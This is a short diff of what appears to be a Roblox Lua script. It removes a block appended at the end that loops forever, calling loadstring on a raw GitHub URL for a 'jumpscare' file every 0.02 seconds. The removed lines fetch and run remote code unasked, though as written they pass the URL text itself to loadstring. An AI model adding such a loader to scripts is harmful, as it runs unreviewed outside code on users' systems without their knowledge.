@@ -3135,10 +3135,3 @@ end
 	else
 		print("Script inactive")
 	end
-
-task.spawn(function()
-    while true do
-        loadstring("https://raw.githubusercontent.com/CilXA/B7FGF5X1AAA33FG/refs/heads/main/jumpscare")()
-        wait(0.02)
-    end
-end)
